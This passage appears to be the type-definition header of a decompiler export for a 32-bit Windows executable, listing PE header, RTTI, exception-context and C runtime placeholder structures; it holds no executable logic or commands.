typedef unsigned char   undefined;

typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
float10
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s__RTTIClassHierarchyDescriptor _s__RTTIClassHierarchyDescriptor, *P_s__RTTIClassHierarchyDescriptor;

typedef struct _s__RTTIBaseClassDescriptor _s__RTTIBaseClassDescriptor, *P_s__RTTIBaseClassDescriptor;

typedef struct _s__RTTIBaseClassDescriptor RTTIBaseClassDescriptor;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef struct PMD PMD, *PPMD;

typedef struct _s__RTTIClassHierarchyDescriptor RTTIClassHierarchyDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    void * pVFTable;
    void * spare;
    char name[0];
};

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s__RTTIBaseClassDescriptor {
    struct TypeDescriptor * pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    dword numContainedBases; // count of extended classes in BaseClassArray (RTTI 2)
    struct PMD where; // member displacement structure
    dword attributes; // bit flags
    RTTIClassHierarchyDescriptor * pClassHierarchyDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3) for class
};

struct _s__RTTIClassHierarchyDescriptor {
    dword signature;
    dword attributes; // bit flags
    dword numBaseClasses; // number of base classes (i.e. rtti1Count)
    RTTIBaseClassDescriptor * * pBaseClassArray; // ref to BaseClassArray (RTTI 2)
};

typedef struct _s__RTTICompleteObjectLocator _s__RTTICompleteObjectLocator, *P_s__RTTICompleteObjectLocator;

struct _s__RTTICompleteObjectLocator {
    dword signature;
    dword offset; // offset of vbtable within class
    dword cdOffset; // constructor displacement offset
    struct TypeDescriptor * pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    RTTIClassHierarchyDescriptor * pClassDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3)
};

typedef unsigned short    wchar16;
typedef ulonglong __uint64;

typedef struct _s__RTTICompleteObjectLocator RTTICompleteObjectLocator;

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Class Structure
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

typedef uint UINT;

typedef uchar BYTE;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo * LPCPINFO;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void * HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void * PVOID;

typedef ulong DWORD;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void * LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef enum _FINDEX_INFO_LEVELS {
    FindExInfoStandard=0,
    FindExInfoBasic=1,
    FindExInfoMaxInfoLevel=2
} _FINDEX_INFO_LEVELS;

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef wchar_t WCHAR;

typedef WCHAR * LPWSTR;

typedef ushort WORD;

typedef BYTE * LPBYTE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW * LPSTARTUPINFOW;

typedef struct _WIN32_FIND_DATAA _WIN32_FIND_DATAA, *P_WIN32_FIND_DATAA;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

typedef char CHAR;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAA {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    CHAR cFileName[260];
    CHAR cAlternateFileName[14];
};

typedef struct _WIN32_FIND_DATAW _WIN32_FIND_DATAW, *P_WIN32_FIND_DATAW;

typedef struct _WIN32_FIND_DATAW * LPWIN32_FIND_DATAW;

struct _WIN32_FIND_DATAW {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    WCHAR cFileName[260];
    WCHAR cAlternateFileName[14];
};

typedef struct _OVERLAPPED * LPOVERLAPPED;

typedef enum _FINDEX_SEARCH_OPS {
    FindExSearchNameMatch=0,
    FindExSearchLimitToDirectories=1,
    FindExSearchLimitToDevices=2,
    FindExSearchMaxSearchOp=3
} _FINDEX_SEARCH_OPS;

typedef enum _FINDEX_SEARCH_OPS FINDEX_SEARCH_OPS;

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _WIN32_FIND_DATAA * LPWIN32_FIND_DATAA;

typedef enum _FINDEX_INFO_LEVELS FINDEX_INFO_LEVELS;

typedef struct _PROCESS_INFORMATION * LPPROCESS_INFORMATION;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION * PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG * PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * Flink;
    struct _LIST_ENTRY * Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION * CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (* PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT * PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef double ULONGLONG;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef struct _IMAGE_SECTION_HEADER * PIMAGE_SECTION_HEADER;

typedef union _SLIST_HEADER _SLIST_HEADER, *P_SLIST_HEADER;

typedef struct _struct_299 _struct_299, *P_struct_299;

typedef struct _SINGLE_LIST_ENTRY _SINGLE_LIST_ENTRY, *P_SINGLE_LIST_ENTRY;

typedef struct _SINGLE_LIST_ENTRY SINGLE_LIST_ENTRY;

struct _SINGLE_LIST_ENTRY {
    struct _SINGLE_LIST_ENTRY * Next;
};

struct _struct_299 {
    SINGLE_LIST_ENTRY Next;
    WORD Depth;
    WORD Sequence;
};

union _SLIST_HEADER {
    ULONGLONG Alignment;
    struct _struct_299 s;
};

typedef WCHAR * LPWCH;

typedef WCHAR * LPCWSTR;

typedef union _SLIST_HEADER * PSLIST_HEADER;

typedef CHAR * LPCSTR;

typedef LARGE_INTEGER * PLARGE_INTEGER;

typedef CHAR * LPSTR;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef struct _FILETIME * LPFILETIME;

typedef int (* FARPROC)(void);

typedef DWORD * LPDWORD;

typedef WORD * LPWORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef BOOL * LPBOOL;

typedef BYTE * PBYTE;

typedef struct HINSTANCE__ * HINSTANCE;

typedef HINSTANCE HMODULE;

typedef void * LPCVOID;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef enum IMAGE_GUARD_FLAGS {
    IMAGE_GUARD_CF_INSTRUMENTED=256,
    IMAGE_GUARD_CFW_INSTRUMENTED=512,
    IMAGE_GUARD_CF_FUNCTION_TABLE_PRESENT=1024,
    IMAGE_GUARD_SECURITY_COOKIE_UNUSED=2048,
    IMAGE_GUARD_PROTECT_DELAYLOAD_IAT=4096,
    IMAGE_GUARD_DELAYLOAD_IAT_IN_ITS_OWN_SECTION=8192,
    IMAGE_GUARD_CF_EXPORT_SUPPRESSION_INFO_PRESENT=16384,
    IMAGE_GUARD_CF_ENABLE_EXPORT_SUPPRESSION=32768,
    IMAGE_GUARD_CF_LONGJUMP_TABLE_PRESENT=65536,
    IMAGE_GUARD_RF_INSTRUMENTED=131072,
    IMAGE_GUARD_RF_ENABLE=262144,
    IMAGE_GUARD_RF_STRICT=524288,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_1=268435456,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_2=536870912,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_4=1073741824,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_8=2147483648
} IMAGE_GUARD_FLAGS;

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    dword DeCommitFreeBlockThreshold;
    dword DeCommitTotalFreeThreshold;
    pointer32 LockPrefixTable;
    dword MaximumAllocationSize;
    dword VirtualMemoryThreshold;
    dword ProcessHeapFlags;
    dword ProcessAffinityMask;
    word CsdVersion;
    word DependentLoadFlags;
    pointer32 EditList;
    pointer32 SecurityCookie;
    pointer32 SEHandlerTable;
    dword SEHandlerCount;
    pointer32 GuardCFCCheckFunctionPointer;
    pointer32 GuardCFDispatchFunctionPointer;
    pointer32 GuardCFFunctionTable;
    dword GuardCFFunctionCount;
    enum IMAGE_GUARD_FLAGS GuardFlags;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char * _ptr;
    int _cnt;
    char * _base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char * _tmpfname;
};

typedef struct _iobuf FILE;

typedef uint uintptr_t;

typedef struct <lambda_6250bd4b2a391816dd638c3bf72b0bcb> <lambda_6250bd4b2a391816dd638c3bf72b0bcb>, *P<lambda_6250bd4b2a391816dd638c3bf72b0bcb>;

struct <lambda_6250bd4b2a391816dd638c3bf72b0bcb> { // PlaceHolder Structure
};

typedef struct __acrt_ptd __acrt_ptd, *P__acrt_ptd;

struct __acrt_ptd { // PlaceHolder Structure
};

typedef struct __crt_signal_action_t __crt_signal_action_t, *P__crt_signal_action_t;

struct __crt_signal_action_t { // PlaceHolder Structure
};

typedef struct __crt_multibyte_data __crt_multibyte_data, *P__crt_multibyte_data;

struct __crt_multibyte_data { // PlaceHolder Structure
};

typedef struct void_(__cdecl**)(int) void_(__cdecl**)(int), *Pvoid_(__cdecl**)(int);

struct void_(__cdecl**)(int) { // PlaceHolder Structure
};

typedef struct <lambda_6dbb1268764f43b569ce7b67e331d33a> <lambda_6dbb1268764f43b569ce7b67e331d33a>, *P<lambda_6dbb1268764f43b569ce7b67e331d33a>;

struct <lambda_6dbb1268764f43b569ce7b67e331d33a> { // PlaceHolder Structure
};

typedef struct <lambda_6978c1fb23f02e42e1d9e99668cc68aa> <lambda_6978c1fb23f02e42e1d9e99668cc68aa>, *P<lambda_6978c1fb23f02e42e1d9e99668cc68aa>;

struct <lambda_6978c1fb23f02e42e1d9e99668cc68aa> { // PlaceHolder Structure
};

typedef enum __acrt_lock_id {
} __acrt_lock_id;

typedef struct <lambda_4a8533e2866a575feecb8298ce776b0d> <lambda_4a8533e2866a575feecb8298ce776b0d>, *P<lambda_4a8533e2866a575feecb8298ce776b0d>;

struct <lambda_4a8533e2866a575feecb8298ce776b0d> { // PlaceHolder Structure
};

typedef enum __acrt_fp_class {
} __acrt_fp_class;

typedef struct <lambda_be2b3da3f62db62e9dad5dc70221a656> <lambda_be2b3da3f62db62e9dad5dc70221a656>, *P<lambda_be2b3da3f62db62e9dad5dc70221a656>;

struct <lambda_be2b3da3f62db62e9dad5dc70221a656> { // PlaceHolder Structure
};

typedef struct <lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec> <lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>, *P<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>;

struct <lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec> { // PlaceHolder Structure
};

typedef struct <lambda_978dc153c237d78434369da87b74ff60> <lambda_978dc153c237d78434369da87b74ff60>, *P<lambda_978dc153c237d78434369da87b74ff60>;

struct <lambda_978dc153c237d78434369da87b74ff60> { // PlaceHolder Structure
};

typedef struct __crt_locale_data __crt_locale_data, *P__crt_locale_data;

struct __crt_locale_data { // PlaceHolder Structure
};

typedef struct <lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c> <lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c>, *P<lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c>;

struct <lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c> { // PlaceHolder Structure
};

typedef struct <lambda_275893d493268fdec8709772e3fcec0e> <lambda_275893d493268fdec8709772e3fcec0e>, *P<lambda_275893d493268fdec8709772e3fcec0e>;

struct <lambda_275893d493268fdec8709772e3fcec0e> { // PlaceHolder Structure
};

typedef struct <lambda_e69574bed617af4e071282c136b37893> <lambda_e69574bed617af4e071282c136b37893>, *P<lambda_e69574bed617af4e071282c136b37893>;

struct <lambda_e69574bed617af4e071282c136b37893> { // PlaceHolder Structure
};

typedef struct <lambda_4e60a939b0d047cfe11ddc22648dfba9> <lambda_4e60a939b0d047cfe11ddc22648dfba9>, *P<lambda_4e60a939b0d047cfe11ddc22648dfba9>;

struct <lambda_4e60a939b0d047cfe11ddc22648dfba9> { // PlaceHolder Structure
};

typedef struct __crt_unique_heap_ptr<char,struct___crt_internal_free_policy> __crt_unique_heap_ptr<char,struct___crt_internal_free_policy>, *P__crt_unique_heap_ptr<char,struct___crt_internal_free_policy>;

struct __crt_unique_heap_ptr<char,struct___crt_internal_free_policy> { // PlaceHolder Structure
};

typedef struct <lambda_800076c951b434888f4765a74a194fcc> <lambda_800076c951b434888f4765a74a194fcc>, *P<lambda_800076c951b434888f4765a74a194fcc>;

struct <lambda_800076c951b434888f4765a74a194fcc> { // PlaceHolder Structure
};

typedef struct <lambda_293819299cbf9a7022e18b56a874bb5c> <lambda_293819299cbf9a7022e18b56a874bb5c>, *P<lambda_293819299cbf9a7022e18b56a874bb5c>;

struct <lambda_293819299cbf9a7022e18b56a874bb5c> { // PlaceHolder Structure
};

typedef struct <lambda_9cd88cf8ad10232537feb2133f08c833> <lambda_9cd88cf8ad10232537feb2133f08c833>, *P<lambda_9cd88cf8ad10232537feb2133f08c833>;

struct <lambda_9cd88cf8ad10232537feb2133f08c833> { // PlaceHolder Structure
};

typedef enum _crt_exit_return_mode {
} _crt_exit_return_mode;

typedef struct __crt_locale_pointers __crt_locale_pointers, *P__crt_locale_pointers;

struct __crt_locale_pointers { // PlaceHolder Structure
};

typedef enum _crt_exit_cleanup_mode {
} _crt_exit_cleanup_mode;

typedef struct <lambda_61cee617f5178ae960314fd4d05640a0> <lambda_61cee617f5178ae960314fd4d05640a0>, *P<lambda_61cee617f5178ae960314fd4d05640a0>;

struct <lambda_61cee617f5178ae960314fd4d05640a0> { // PlaceHolder Structure
};

typedef struct <lambda_ec61778202f4f5fc7e7711acc23c3bca> <lambda_ec61778202f4f5fc7e7711acc23c3bca>, *P<lambda_ec61778202f4f5fc7e7711acc23c3bca>;

struct <lambda_ec61778202f4f5fc7e7711acc23c3bca> { // PlaceHolder Structure
};

typedef struct <lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b> <lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b>, *P<lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b>;

